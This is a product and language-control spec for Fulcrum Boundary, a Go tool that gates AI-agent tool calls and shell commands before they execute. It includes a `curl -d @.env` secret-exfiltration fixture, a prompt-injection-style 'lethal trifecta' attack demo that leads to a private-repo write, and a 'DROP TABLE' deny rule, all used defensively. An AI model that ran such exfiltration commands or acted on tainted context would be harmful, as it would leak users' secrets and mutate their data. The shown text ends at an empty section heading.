# Fulcrum Boundary — Authoritative Public Surface Spec (Current Release)

> **This is the single authoritative public-surface spec** for the current public release surface of
> **Fulcrum Boundary** (Apache-2.0, Go developer tool,
> `github.com/fulcrum-governance/fulcrum-boundary`, CLI binary `boundary`, target tag `v0.9.0`).
> It defines what is published and what it is called. It is a language-control document:
> §12 enumerates the approved and forbidden public language, so it intentionally quotes the
> forbidden phrases in order to govern them.
>
> **Ground truth.** Every capability statement carries a **status** —
> `production` | `delivered` | `delivered-preview` | `preview` | `starter` | `local-only` — and an
> **evidence pointer** (a repo path and/or a `BND-CLAIM-*` ledger ID), checkable against
> `claims/boundary_claims.yaml`.
>
> **Research provenance.** Grounded in `research/BOUNDARY_LAUNCH_BRIEFING.md` (master) plus
> `BOUNDARY_OVERVIEW.md`, `SPEC_RECONCILIATION.md`, `CROSS_REPO_DEPS.md`, `BOUNDARY_BLOCKERS.md`,
> `POSITIONING.md`, `TEST_READINESS.md`.
>
> **Companion artifact.** `LAUNCH_BLOCKER_CHECKLIST.md` ships beside this spec and holds the full
> release-readiness gate (B-1…B-4, G1–G8, the PR template, the testing-doc outline). It is referenced
> from **§9** and **§10**; this spec does not re-inline it.

---

## How to read this spec

**Authority order (tie-breaker for any claim; highest wins).**
`docs/RELEASE_TRUTH_PUBLIC.md` (v0.9.0) → `claims/boundary_claims.yaml` + `docs/CLAIMS_LEDGER.md`
(**CI-enforced**, the binding floor) → `README.md` (v0.9.0) → most-recent intent
(`conductor/2026-05-29-*-reset-{design,plan}.md`, polish only) → the language stack
(`docs/LANGUAGE_SYSTEM.md` / `docs/COPY_RULES.md` / `docs/LEXICON.md` /
`docs/BOUNDARY_PRODUCT_PRIMITIVES.md`) → `docs/LAUNCH_TRUTH_FREEZE.md` →
`Fulcrum_Boundary_Vision.md` (north star; direction only). **Demoted, never cited as
authority:** `BOUNDARY_SPEC_SERIES.md`, the "governance kernel / kernel-connected" framing,
all GIL-named material, the per-version `RELEASE_TRUTH_V0xx` history.

**Status legend (canonical — stated once; every capability statement carries one).** These six
spec statuses map onto the ledger's three machine values (`delivered` / `partial` / `false`):

| Spec status | Maps to ledger | Meaning |
|---|---|---|
| `production` | `delivered` | **The one production route: MCP**, and only MCP. Full lifecycle proven incl. integration + fail-mode tests; production gap is deployment topology only. |
| `delivered` | `delivered` | Real, tested code that is the genuine article on its own terms but is **not the production route** — the Go SDK core, the CLI command mechanics, the GitHub Action (CI-local). |
| `delivered-preview` | `delivered` | Real, tested code that governs **routed paths only** and ships a fixture demo (Command / Edit Boundary); production gated on deployment-bypass proof. |
| `preview` | `partial` | Core lifecycle works; gated on deployment-bypass (and sometimes live-conformance) evidence. |
| `starter` | `delivered` | Deliberately incomplete output requiring operator review (generated policies). |
| `local-only` | `delivered` | Reads local artifacts, not hosted (dashboard, doctor, evidence, version). |

> **C4 boundary.** The bare word **"production" is reserved for the MCP route ONLY** (§1.6, §4.0).
> The SDK core, CLI mechanics, and Action are genuinely shipped, so they carry `delivered`
> (production-grade core / CI-local) — **not** the word "production." This keeps the lock and
> the labels in agreement.

**Design rule.** Every section that resolves a prior conflict states the chosen side
**explicitly and exclusively**, with a one-line `superseded: <old framing>` so it cannot resurface.
The C-decisions are stated **once** in the master lock table below and once in their owning
section; sections do not re-duplicate them.

---

## Owner-confirmed decisions (non-negotiable; the master lock table)

This table is the single canonical statement of every locked decision. Each is restated once — and
only once — in its owning section with a `superseded:` predecessor. No section re-tabulates them.

| ID | Locked decision | Superseded (do not revive) | Owned in |
|---|---|---|---|
| **TOP-LINE** | Boundary is **the action boundary for routed agent tools** (broader than MCP; *routed* carries the honesty). Hero, verbatim: **"See what your AI tools can do. Block what they should not."** | "the action boundary for **MCP-native** agents" (README v0.6.1 line 3) — MCP is the first production route, not the identity | §1.1–§1.2 |
| **C1** | Category = **DEVELOPER TOOL.** NOT governance / compliance / CISO / "AI Trust Platform." "governance" is internal/ADR/org-name vocabulary only. | "governance kernel / pre-execution control plane" as public identity (`BOUNDARY_SPEC_SERIES.md`, ADR-028) | §1.4 |
| **C2** | Name = **"Fulcrum Boundary"** (CLI: `boundary`). "MCP Safety Gateway" = **campaign label only**, never the project name. | "GIL / Governance Interception Layer", "Zero-Trust MCP Router", any transport-named title | §1.5 |
| **C3** | **Standalone OSS, ZERO private-repo dependency** as a release invariant (proven: offline build, empty Fulcrum `go mod graph`). Kernel mode = **documented contract surface only**. | "out-of-process enforcement boundary of the Fulcrum kernel (Redis/NATS/trust/proofs)" | §1.7, §5, §10.7 |
| **C4** | The word **"production" is reserved for the MCP route only.** Honest per-surface maturity everywhere else (SDK/CLI/Action = `delivered`, not "production"). | "production-grade pre-execution control plane" (whole tool) | §1.6, §4.0 |
| **C5** | **The spine = TWO demoed proof lanes**, each fixture-only. All other adapters stay in the honest preview matrix, **not** headline. Cut breadth first, never the proof path. | "broad surface — 6+ adapters + Managed Agents + trust + SQL-AST as headline features" | §1.6, §4.0 |
| **C6** | Decision artifacts = **"decision records" (hash-verifiable).** NEVER "cryptographic proof of verdict" — no signing ships. | "receipts / cryptographic proof of verdict" as default language | §1.8, §6 |
| **C7** | Runtime decisions are **`deterministic` / `classified`, NEVER `proved`.** Lean proofs referenced by correspondence only (`docs/PROOF_BOUNDARY.md`). | "proved runtime / decisions proved by Lean" | §1.9, §3.4, §6.5 |
| **C8** | **Vendor-neutral copy** — no named competitors / third parties. | named-competitor / named-third-party copy (early fixtures/flags/tests) | §1.10, §7.3 |
| **C9** | **ROUTED-ONLY DOCTRINE** (load-bearing, sharpest for CLI): Boundary governs **only what routes through it**. The CLI lane states (i) how to ENFORCE the route and (ii) the KNOWN BYPASSES. FORBIDDEN: "global shell control", "all CLI activity protected", "governs every way an agent can mutate". | "governs every way an agent can mutate" (Position A) | §1.11, §3.5, §10.0 |
| **C10** | Distribution = **local + `go install …/cmd/boundary@v0.9.0` only.** No hosted-monitoring / Homebrew / package-manager claims. Dashboard reads local artifacts only. | implied hosted monitoring / package-manager distribution | §1.12, §7.4 |
| **R1** | Copy subject = **"Boundary decides", NEVER "Fulcrum decides".** | `docs/LANGUAGE_SYSTEM.md` lines 11 & 18 + `docs/PUBLIC_RELEASE_COPY.md` line 70 | §2.1, §7.6 |
| **P1** | Developer trust lever = **policy-as-code tests.** `boundary test` is local, fixture-only, and CI-friendly; it reports verdicts for routed request fixtures only. | treating policy behavior as docs-only or claiming policy tests prove deployment enforcement | §2.2, §9, §10 |

> **Honesty-as-a-feature (applies to every section).** The claims ledger, the language lint, the
> public-surface guard, and the "What It Does NOT Prove" tables are a **differentiator**, not a
> weakness. Lead with them.

---

## Table of contents

1. Identity & Positioning
2. Product Surface
3. Mental Model & Architecture
4. Scope & Maturity Matrix
5. Standalone & Integration Contract
6. Decision Records & Proof Boundary
7. Claims & Truth Discipline
8. Quickstart & Demos
9. Testing & Contributing
10. Limitations & Threat Model
11. Roadmap (future direction)
12. Appendix: Lexicon & Forbidden Language

---

# 1. Identity & Positioning

> This section is a **language contract, not marketing**. Every approved phrase stays inside the
> evidence tracked by the claims ledger; every forbidden phrase is banned from public capability
> copy and may appear only in claim-control, language-control, historical, or explicit-limitation
> context. The locked decisions below are stated once here and indexed in the master lock table.

## 1.1 Top-line, hero, one-liner (LOCKED — state exclusively)

> **Fulcrum Boundary is the action boundary for routed agent tools.**
>
> **Hero (verbatim, do not edit): See what your AI tools can do. Block what they should not.**

- The category-defining noun is **"the action boundary."** The qualifier is **"routed agent tools"** — broader than MCP, and the word **"routed"** carries the honesty: Boundary governs only what is forced through it.
- **One-liner (LOCKED):** *Boundary is the local-first action boundary for your AI agent's tools — see what your tools can actually do, and block the dangerous ones before they run. One `go install`, no account, no cloud, no live calls.* Each clause is backed by the repeatable first-run path (`go install …@v0.9.0` → `boundary selftest` 10/10 → `boundary demo github-lethal-trifecta` denies with `upstream_called=false`; evidence: README "Try It In One Minute", briefing §1).
- The hero ships verbatim in `docs/LANGUAGE_SYSTEM.md` (Developer variant) and the v0.9.0 README. It leads with the action, not the architecture. When copy is MCP-specific, "your MCP tools" / "MCP-native" is correct and preferred **for that lane**.
- **superseded:** "the action boundary for **MCP-native** agents" (README v0.6.1 line 3 / `docs/LANGUAGE_SYSTEM.md` "Preferred Public Frame"). MCP is now the **first production route**, not the identity, so the Command/CLI lane and future routes fit the same frame without re-scoping.

## 1.2 The category (LOCKED — resolves C1)

- **Fulcrum Boundary is a DEVELOPER TOOL.** Initial customer = the developer, on their own machine.
- It is **NOT** a governance system, **NOT** a compliance product, **NOT** a CISO/enterprise platform, **NOT** an "AI Trust Platform," **NOT** an observability/dashboard product.
- **"governance" is internal / ADR / org-name vocabulary ONLY** — it may appear in the org name (`Fulcrum-Governance`), an internal Go package name, and architecture-lineage docs, but **never** as the public product hook, category word, or a headline noun. (`docs/LANGUAGE_SYSTEM.md` says "use 'governance' as category language only"; this spec hardens it to *not even category language in public copy*.)
- **superseded:** the enterprise/"governance kernel" positioning thread (`BOUNDARY_SPEC_SERIES.md`, Karpathy positioning). Demoted to internal lineage; do not resurface.

## 1.3 The name (LOCKED — resolves C2)

- **Project name = "Fulcrum Boundary."** **CLI binary = `boundary`.** Module = `github.com/fulcrum-governance/fulcrum-boundary`.
- **"MCP Safety Gateway" = campaign label ONLY** — the name of the first release campaign, never the project name. It may appear as a campaign heading and survives in claim text (`BND-CLAIM-001`) and `docs/LEXICON.md` as a *governed-route example*, but copy must never read as if the product is called "MCP Safety Gateway."
- **superseded:** "GIL" / "Governance Interception Layer," "Zero-Trust MCP Router," and any transport-named project title (GIL launch plans `v1`–`v2.1`). Renamed at planning `v3.2` (2026-05-26); repo + module rename shipped 2026-05-27 (`docs/LAUNCH_TRUTH_FREEZE.md`). Do not name the project after one transport.

## 1.4 The spine — TWO demoed proof lanes (LOCKED — resolves C4/C5)

The release story is a **tight spine of two flagship proof lanes**, each with a **fixture-only demo** (no credentials, no network, no live mutation). Breadth ships as a labeled preview matrix (§4.2), never as headline features. The canonical spine table is **§4.0**; this is the identity-level statement.

- **Lane 1 — MCP, the FIRST PRODUCTION route** (`production`): `boundary demo github-lethal-trifecta` denies a tested write-after-taint action **before upstream** (`upstream_called=false`) with a decision record.
- **Lane 2 — Command / CLI, a DELIVERED PREVIEW** (`delivered-preview`, routed-only): `boundary demo command-secret-exfil` denies a routed `curl -d @.env …` **before execution** (`executed=false`) with a decision record (underlying fixture/evidence path: `boundary redteam --pack command-secret-exfil`).
- All other adapters/profiles stay in the **honest preview matrix, not the headline** (§4.2). Do not cut the proof path; cut breadth first.
- **C4 — the word "production" is reserved for the MCP route only.** Everywhere else uses honest per-surface maturity; the Go SDK core, CLI mechanics, and GitHub Action are `delivered` (genuinely shipped) but are **not** labeled "production." (Full per-surface treatment: §2, §4.)
- **superseded:** "production-grade pre-execution control plane" as a whole-product maturity claim, and the broad-surface launch (6+ adapters + Managed Agents + trust + SQL-AST as headline features) — `BOUNDARY_SPEC_SERIES.md`. Per-surface truth wins (`docs/RELEASE_TRUTH_PUBLIC.md`).

## 1.5 Standalone OSS (LOCKED — resolves C3)

- Boundary is a **standalone, downloadable OSS tool** with **zero private-repo dependency** (proven: offline build of all packages, empty `go mod graph` for Fulcrum modules — `CROSS_REPO_DEPS.md`). Policies are local YAML; trust is an in-process interface defaulting to `Trusted` when absent; no Redis/NATS/fulcrum-io required to get value.
- **Kernel-connected mode = a documented contract surface ONLY** (`BND-CLAIM-010`; `docs/PROOF_BOUNDARY.md`). The release must not depend on any sibling repo being present. (Full mechanics §5; threat posture §10.7.)
- **superseded:** Boundary framed as "the out-of-process enforcement boundary of the Fulcrum kernel (Redis/NATS/trust/proofs)" (`BOUNDARY_SPEC_SERIES.md`).

## 1.6 Decision artifacts & proof boundary (LOCKED — resolves C6/C7)

- **C6 — decision records.** Boundary emits **"decision records"** — structured, and where configured **receipt-grade** with request, policy-bundle, and decision **hashes** that are **hash-verifiable** (`BND-CLAIM-002`, `BND-CLAIM-005`). **NEVER** "cryptographic proof of verdict," "signed receipt by default," or "signature" — **no signing ships** (`BND-CLAIM-002.forbidden`). Full mechanics §6. *superseded: "receipts / cryptographic proof of verdict" as default language.*
- **C7 — proof boundary.** Runtime decisions are **"deterministic"** (or **"classified"** for an escalation), **NEVER "proved."** Boundary does not emit `proved`/`human_approved` (`docs/PROOF_BOUNDARY.md`; `BND-CLAIM-010.forbidden`). Lean/formal proofs are **bounded invariants** in `Fulcrum-Proofs`, referenced **by correspondence only**. Full mechanics §3.4, §6.5. *superseded: "proved runtime / proved decisions" framing.*

## 1.7 Vendor-neutral (LOCKED — resolves C8)

- **No named competitors or third parties in public copy.** External MCP ingest is Boundary-owned mapping ("external MCP inventory NDJSON," `--source external-mcp`), **not** an official third-party integration or compatibility claim.
- Competitor framing lives **only** in private market maps with `verified_at` + sources and neutral, category-level trade-off language ("scanners," "policy substrates," "platforms") — **never in public copy, and never by brand.** No brand name appears in this spec.
- **superseded:** any literal named-competitor / named-third-party copy in early fixtures, flags, or tests (already scrubbed; keep it scrubbed).

## 1.8 Routed-only doctrine (LOCKED — load-bearing, SHARPEST for CLI — resolves C9)

**Boundary governs ONLY what routes through it.** This is honesty-as-a-feature and the single most load-bearing constraint in the CLI lane. The canonical, two-halves treatment (enforce-the-route mechanisms + known bypasses, with verified evidence) lives **once** in **§10.0**; §3.5 and §8.2 cross-reference it.

- **(i) ENFORCE the route:** `boundary command run -- <cmd>`; `boundary shell`; project-local `.boundary/bin` shims; PATH precedence (the shim resolves ahead of the bare binary). Global shim install is refused by design.
- **(ii) KNOWN BYPASSES (stated, not hidden):** a direct PATH binary; CI / SSH / editor-terminal / cron / launchd; arbitrary non-shimmed routes. If it does not route through Boundary, Boundary makes no claim about it.
- **superseded:** any aspiration to govern "every way an agent can mutate." **FORBIDDEN:** "global shell control," "all CLI activity protected," "governs every way an agent can mutate" (see §12.3).

## 1.9 Distribution (LOCKED — resolves C10)

- **Local + `go install github.com/fulcrum-governance/fulcrum-boundary/cmd/boundary@v0.9.0` ONLY.** Requires Go 1.25+ and a C toolchain (CGO) for the default build (§5.5).
- **No** hosted-monitoring, **no** Homebrew, **no** package-manager distribution claims. The **dashboard reads local artifacts only** (`local-only`). Full mechanics §7.4.
- **superseded:** implied hosted monitoring / package-manager distribution (early planning copy).

---

# 2. Product Surface

> Boundary ships **four overlapping developer surfaces from one Go module** — there is **no daemon
> you must run to get value**. The headline experience is a local CLI needing **no credentials, no
> network, and no live mutation**. *Evidence (whole-surface):* `BOUNDARY_OVERVIEW.md` §1; verified
> `go install … && boundary selftest` (10/10) and `boundary demo github-lethal-trifecta` (DENY, no
> upstream call); module `go.mod`.

## 2.1 The four surfaces

Per **C4**, "production" labels the MCP route only. The SDK core, CLI command mechanics, and the
GitHub Action are genuinely shipped and carry `delivered`. "Boundary decides" is true identically
across all four — they are the same decision core (`governance.Pipeline`, §3) reached through
different entrypoints. (R1)

| # | Surface | One-line developer value | Status | Evidence pointer |
|---|---------|---------------------------|--------|------------------|
| **A** | **CLI — `boundary`** (~29 commands) | "See what your AI tools can do, then block the dangerous action before it runs — from one local binary, no account." | **delivered** (CLI mechanics; per-command status in §2.2) | `internal/boundarycli/cli.go`; `cmd/boundary/main.go` |
| **B** | **Go SDK** — `governance` + `policyeval` | "Embed the same fail-closed decision pipeline in three lines, with a portable, zero-infra policy evaluator (no DB/Redis/NATS)." | **delivered** (production-grade core) | `governance/pipeline.go`; `policyeval/`; `examples/*/main.go`; BND-CLAIM-002/008 (`delivered`) |
| **C** | **HTTP MCP gateway** — `boundary serve` / `adapters/mcp.Gateway` | "Drop a governed JSON-RPC proxy in front of an MCP server: every tool call is decided before forwarding, `tools/list` is filtered, fails closed." | **production** (the one production adapter) | `adapters/mcp/gateway.go`; `adapters/mcp/readiness.yaml` (`status: production`); BND-CLAIM-006 |
| **D** | **GitHub Action** — `actions/mcp-audit` | "Run the MCP inventory + risk graph in CI and get a GitHub-rendered SARIF report on every PR." | **delivered (CI-local)** | `actions/mcp-audit/action.yml`; `scripts/actions/mcp-audit.sh`; BND-CLAIM-017 (`delivered`) |

> **R1 lock.** Copy subject is **"Boundary decides," never "Fulcrum decides."** "Fulcrum" appears
> only in the module path, proof-correspondence lineage, and as upstream owner of the
> `proved`/`human_approved` modes. *superseded: the "…Fulcrum decides…" residues in
> `docs/LANGUAGE_SYSTEM.md` lines 11 & 18 and `docs/PUBLIC_RELEASE_COPY.md` line 70.*

## 2.2 Surface A — the `boundary` CLI (command map)

Entry `cmd/boundary/main.go` → dispatcher `internal/boundarycli/cli.go`. **29 top-level commands**
dispatch (verified: the dispatch switch in `internal/boundarycli/cli.go`, `Run`); several carry subcommands (`policy generate`,
`mcp proxy`, `secure github setup|serve`, `demo <6>`, `evidence bundle|verify`, `trust show|reset`),
giving the **~31 user-facing commands** cited in the research. Per-command status uses the §0 legend
— `delivered` for the local no-mutation tooling, `delivered-preview` for routed-only lanes,
`starter` for policy generation, `local-only` for the dashboard. The first-value "aha" is
`inventory` / `graph` against the developer's *own* machine.

| Command | Developer value | Status | Evidence |
|---------|-----------------|--------|----------|
| `version` | Print version + build metadata (text/JSON). | delivered | `cli.go:37` |
| `selftest` | 10-check no-credential local release smoke test. **Verified 10/10.** | delivered | `cli.go:57`; `internal/selftest/` |
| `init` | Initialize a `.boundary/firewall` workspace (read-only inventory; writes no MCP config). | delivered | `cli.go:39` |
| `inventory` | Discover MCP client configs (Claude Desktop / Cursor / VS Code / repo `.mcp.json`) and list routable tools. Formats: `json`, `ndjson`, `markdown`, **`sarif`**. | delivered | `cli.go:41`; `internal/firewall/` |
| `graph` | Render inventory-derived MCP risk paths (`json` or **`mermaid`**) — e.g. untrusted-context → private-repo-mutation. | delivered | `cli.go:43`; `internal/firewall/` |
| `dashboard` | Render a **local-only** HTML/artifact dashboard (reads local files; not hosted). | **local-only** | `cli.go:45`; `internal/firewall/dashboard.go` |
| `install` / `uninstall` | Rewrite selected MCP client configs to route through Boundary; restore from an install receipt. `--dry-run` supported. | delivered | `cli.go:47,49` |
| `lock` / `verify-lock` | Create + verify a descriptor **lockfile**; detect drift, fail-closed. | delivered | `cli.go:51,53` |
| `redteam` | Run safe **fixture** attacks (e.g. `--pack command-secret-exfil`, github-lethal-trifecta) and assert expected `deny`. | delivered | `cli.go:55`; `internal/redteam/` (`redteam.go:16` = `--pack`) |
| `secure` | Manage **Secure MCP / Secure GitHub preview** profiles (`secure github setup|serve`). | **preview** | `cli.go:59`; `adapters/securegithub/readiness.yaml` |
| `command` | Classify + govern project-local **command** paths (Command Boundary). | **delivered-preview** | `cli.go:61`; `internal/commandboundary/` |
| `edit` | Classify proposed **file mutations** (Edit Boundary); `edit apply` gates patches. | **delivered-preview** | `cli.go:63`; `internal/editboundary/` |
| `shell` | Launch a project-local Command Boundary subshell (enforces the route — §10.0). | **delivered-preview** | `cli.go:65`; `internal/commandboundary/` |
| `policy generate` | Generate **starter** YAML policies (6 files / 12 rules) for operator review. | **starter** | `cli.go:67`; `internal/firewall/` |
| `verify` | Validate YAML policy files (parse + warnings). | delivered | `cli.go:75` |
| `mcp proxy` | Fail-closed generic MCP proxy entrypoint for installed routes. | production (MCP) | `cli.go:69`; `adapters/mcp/` |
| `serve` | Start the Boundary **HTTP gateway** (MCP proxy or Postgres demo). | production (MCP) | `cli.go:71`; `adapters/mcp/gateway.go` |
| `demo` | `action-boundary`, `postgres`, `github-lethal-trifecta`, `command-secret-exfil`, `tamper-evidence`, `trust-degradation` — fixture-only (6 demos). | delivered | `cli.go:73`; `internal/demo/` |
| `verify-record` | Verify a **decision record** (`request_hash`, `policy_bundle_hash`, binary digest). | delivered | `cli.go:77` |
| `explain` | Render a decision record read-only: verdict, reason, route context, and hash coverage. | local-only | `cli.go:79`; `internal/explain/` |
| `replay` | Re-evaluate a recorded request against a supplied policy bundle and reproduce the decision fields. | local-only | `cli.go:81`; `internal/replay/` |
| `test` | Run operator-authored policy-as-code cases against local policy bundles and expected verdicts. | local-only | `cli.go:83`; `tests/test_runner/`; `docs/POLICY_TESTING.md`; BND-CLAIM-TEST-001 |
| `doctor` | Local routed-surface diagnostics **+ bypass caveats** (§10.0). | local-only | `cli.go:85`; `internal/doctor/` |
| `evidence` | `bundle` + `verify` local evidence manifests (SHA-256 artifact hashes). | local-only | `cli.go:87`; `internal/evidence/` |
| `audit` | Pretty-print structured **decision-record** logs (filter by agent/tool/action). | delivered | `cli.go:89` |
| `trust` | Inspect / reset adaptive trust state. **Opt-in** (`--trust-mode disabled|standalone|kernel`). | delivered | `cli.go:91`; `governance/trust*.go` |

## 2.3 Surface B — the Go SDK (`governance` + `policyeval`)

A developer embeds the exact decision core (status: **delivered**, production-grade):

```go
pipeline := governance.NewPipeline(cfg, trust, evaluator, auditor) // all args nilable
decision, _ := pipeline.Evaluate(ctx, &governance.GovernanceRequest{ /* … */ })
if !decision.Allowed() { /* block before the tool runs */ }
```

- **`governance`** — the four-stage pipeline (§3). All `NewPipeline` args are optional; pass `nil` for components you do not have (`governance/pipeline.go`, `NewPipeline`).
- **`policyeval`** — a **portable, in-memory, zero-infra** evaluator (README: **no DB / Redis / NATS**). 11 condition types (FIELD_MATCH, REGEX, RANGE, IN_LIST, CONTAINS, STARTS_WITH, ENDS_WITH, STATISTICAL_SPIKE, EXTERNAL_CALL [disabled by default, SSRF-guarded], SEMANTIC [escalates — fail-closed for LLM], LOGICAL).
- **6 compilable examples:** `simple`, `mcp-proxy`, `custom-interceptor`, `rate-limit`, `redis-trust`, `http-middleware`.

*Evidence:* `governance/pipeline.go`; `policyeval/` (README + `evaluator.go` + `conditions*.go`); `examples/{…}/main.go`.
*Honest caveat (carry verbatim):* the `<10ms P99` evaluator figure is a **design target, unmeasured** (no in-tree benchmark) — `BOUNDARY_OVERVIEW.md` §2.

## 2.4 Surface C — the HTTP MCP gateway (`boundary serve` / `adapters/mcp.Gateway`)

`boundary serve` stands up an `http.Server` that is a governed **MCP JSON-RPC proxy** (`mcp.NewGateway` forwarding to an upstream MCP HTTP URL). It **governs every request before forwarding**, **filters `tools/list`**, **preserves request IDs**, and **fails closed**. In deployment this is the surface that sits in front of an MCP server — and it is **the project's one `production` adapter**.

*Evidence:* `adapters/mcp/gateway.go` (`ServeHTTP` governs single + batch JSON-RPC, writes governance headers, `204 No Content` on suppressed emit); `adapters/mcp/readiness.yaml` (`status: production`; `parse/identify/evaluate/deny/forward/inspect/metadata/fail_closed = implemented`; `record`, `bypass_proof = delegated`). Status: **production**.

> **Routed-only caveat (load-bearing).** `bypass_proof` is **delegated to deployment network topology**. The gateway governs the route; proving it is the *sole* path to the MCP server is a deployment guarantee, not a code guarantee. See §10.0–§10.1.

## 2.5 Surface D — the GitHub Action (`actions/mcp-audit`)

A composite action that packages `inventory` / `graph` / `policy generate` as a CI step, emitting **Markdown + SARIF** (GitHub renders SARIF natively in the Security tab). Inputs: `root`, `format`, `sarif`, `fail-on-critical`, `include-defaults`. Outputs: `critical-count`, `high-count`, `report-path`, `sarif-path`. It scans repo-local MCP configs by default and **does not** scan runner home directories unless `include-defaults` is enabled. Status: **delivered (CI-local)** — a CI audit/reporting step, **not** runtime protection.

*Evidence:* `actions/mcp-audit/action.yml`; `scripts/actions/mcp-audit.sh`; BND-CLAIM-017 (`delivered`; forbidden: "Boundary Action protects MCP servers at runtime", "installs the gateway").

---

# 3. Mental Model & Architecture

## 3.1 The mental model: **see → decide → prove**

The three-beat story Boundary already ships and the launch leads with.

- **See** — discover the MCP tools your agents are wired to (`inventory`) and render the dangerous paths (`graph`, mermaid).
- **Decide** — return **`allow | deny | warn | escalate | require_approval`** on a proposed action *before it executes*, **fail-closed by default**.
- **Prove** — emit a **hash-verifiable decision record** of the verdict (`verify-record`, `audit`, `evidence`). **"Decision record," never "cryptographic proof of verdict"** — no signing ships. (C6)

*Evidence:* `BOUNDARY_OVERVIEW.md` §1; `BOUNDARY_LAUNCH_BRIEFING.md` §1; README core model.

## 3.2 The four-stage pipeline (`governance/pipeline.go`)

`Pipeline.Evaluate(ctx, req)` runs **four ordered stages**. Each stage is a **silent no-op, not an error**, when it has no data (nil `TrustChecker`, empty `AgentID`, no interceptor, no static rules). The first stage to reach a terminal verdict returns; otherwise control falls through, defaulting to `allow`.

| Stage | Name | What it does | Terminal behavior | Evidence (`pipeline.go`) |
|-------|------|--------------|-------------------|--------------------------|
| **1** | **Trust check** (`TrustChecker`) | Skipped when checker `nil` or `AgentID==""`. Isolated/Terminated → `deny`; Evaluating → score 0.5; enforces `RequireAgentID` for protected transports. | checker **error → fail-closed `deny`** | `Evaluate`, stage 1 trust check |
| **2** | **Static policies** | Linear scan of `StaticPolicyRule`s. Tool matches by exact name, `*`/`""`, or `path.Match` glob (malformed → silent non-match). Supports field matches (e.g. `arguments.sql contains "DROP TABLE"`). | first matching `deny`/`warn`/`escalate`/`require_approval` is terminal | `Evaluate`, stage 2 static policies; `toolMatches` |
| **3** | **Domain interceptors** (`Interceptor` registry, one fn/tool) | Where SQL parsing, path allow-lists, rate limits live. `nil,nil` declines; `Allowed=false` blocks. | interceptor **error → fail-closed `deny`** | `Evaluate`, stage 3 domain interceptors |
| **4** | **PolicyEval engine** (`policyeval.Evaluator`) | Full policy evaluation. Maps `ActionDeny/Escalate/RequireApproval/Warn`. | evaluator **error → per-transport: fail-closed transports `deny`, others fail-open** | `Evaluate`, stage 4 PolicyEval engine |

> The `Evaluate` doc comment notes standalone vs Redis-backed trust modes for Stage 1 (`governance/pipeline.go`, `Evaluate`); for the OSS dev-tool spec, **trust is opt-in and defaults to absent** — Stage 1 is a no-op unless the developer enables `--trust-mode`. Treat the kernel/Redis framing as an internal implementation note. (C3)

**Audit-once guarantee.** Audit emits **exactly once** per call via a deferred hook, **after** the real decision is computed but **before** dry-run conversion — so logs always reflect the true verdict (`governance/pipeline.go`, `Evaluate` deferred hook; `emitAudit`). An adaptive-trust transition emits a second `trust_transition` event.

**Dry-run / shadow mode** (`PipelineConfig.DryRun`): runs all four stages, audits the *real* decision, then converts a `deny` to `allow` with reason prefixed `DRY-RUN would deny:` — the canonical audit-only rollout before enforcing (`governance/pipeline.go`, `Evaluate` dry-run conversion).

## 3.3 The five-verb verdict (fail-closed)

Every decision resolves to **exactly one of five verbs**, all literal outcomes in `pipeline.go`:

| Verb | Meaning | Decision mode |
|------|---------|---------------|
| **`allow`** | Proceed to the tool. | `deterministic` |
| **`deny`** | Block before execution. | `deterministic` |
| **`warn`** | Allow but flag (covers policy `warn`/`audit`). | `deterministic` |
| **`escalate`** | Could not resolve deterministically; route to follow-up. | **`classified`** |
| **`require_approval`** | Hold for an approver. | `deterministic` |

*Evidence:* literal verbs at `governance/pipeline.go`, `Evaluate` (verdict assignments); `Allowed()` at `governance/request.go:97`.

**Fail-closed by default.** On a stage error, the **fail-closed transports** deny rather than allow. The default set (`DefaultFailClosedTransports`, `governance/pipeline.go`): **`mcp`, `managed_agents`, `cli`, `code_exec`, `grpc`, `a2a`**. A `nil` `FailClosedTransports` applies this secure default; a **non-nil empty slice is an explicit opt-out to fail-open**; a populated slice fail-closes exactly the listed transports. (Transport constants: `governance/request.go:9–15`.)

## 3.4 Decision modes — Boundary never says "proved" (C7)

`DecisionMode` labels the epistemic confidence of a verdict. Four modes exist; **from its own logic Boundary produces only two** (`deterministic` and `classified`), and it **never emits `proved`**:

- **`deterministic`** — static rule / deterministic code path (the default for every Boundary outcome), and the kernel escalation-await seam's mechanical denies (resolver-side record expiry, local await timeout, every escalation fault).
- **`classified`** — set when PolicyEval returns `Escalate` (`governance/pipeline.go`, `Evaluate` stage 4 escalate path), and the relabel default an await handler falls back to when it returns no adoptable mode.
- **`proved`** is **reserved for the upstream Foundry layer (fulcrum-io)** and is never emitted by Boundary; the escalation seam is guarded against adopting it (`isAdoptableEscalationMode`, `governance/pipeline.go`).
- **`human_approved`** is likewise not **originated** by Boundary, but a pipeline decision **can carry** it when the kernel escalation-await seam **relays** a human-review resolution (`approved`→allow / `denied`→deny) from the upstream layer (`governance/kernel/escalation.go`; adopted by `resolveEscalation` in `governance/pipeline.go`). This is a kernel-mode, routed-only path requiring an injected `Subscriber` and a deployed resolver; with no handler configured (the default, and the standalone path) Boundary never emits it.
- **superseded:** "Boundary emits only two modes / Boundary never emits `human_approved`" and the source phrase **"never originate here"** (which the pipeline mode-reservation comment no longer uses — it was rewritten to the relay framing). Boundary still never **mints** `proved`/`human_approved` from its own logic; the only change is that the kernel escalation seam **relays** a `human_approved` verdict. The `proved` invariant in this section is unchanged.

> **Hard rule for all copy.** Runtime decisions Boundary mints itself are **"deterministic" / "classified," never "proved."** A relayed `human_approved` from the kernel escalation seam is the one mode Boundary surfaces without originating it. Lean proofs are referenced **by correspondence only** (`docs/PROOF_BOUNDARY.md`). (C7; full treatment §6.5.)

## 3.5 The routed-only doctrine (load-bearing — pointer to §10.0)

**Boundary governs only what routes through it.** This is the single most load-bearing constraint, sharpest for the Command/CLI lane. The **canonical** treatment — both halves (how to ENFORCE the route; the KNOWN BYPASSES) with verified code evidence and forbidden-copy callouts — lives **once** in **§10.0**, and the CLI walkthrough is in §8.2. In short: (i) enforce via `boundary command run` / `boundary shell` / project-local `.boundary/bin` shims / PATH precedence; (ii) known bypasses = direct PATH binary, CI/SSH/editor-terminal, arbitrary non-shimmed routes. **FORBIDDEN:** "global shell control," "all CLI activity protected," "governs every way an agent can mutate." (C9; see §10.0, §12.3.)

## 3.6 The two-lane proof spine (pointer to §4.0)

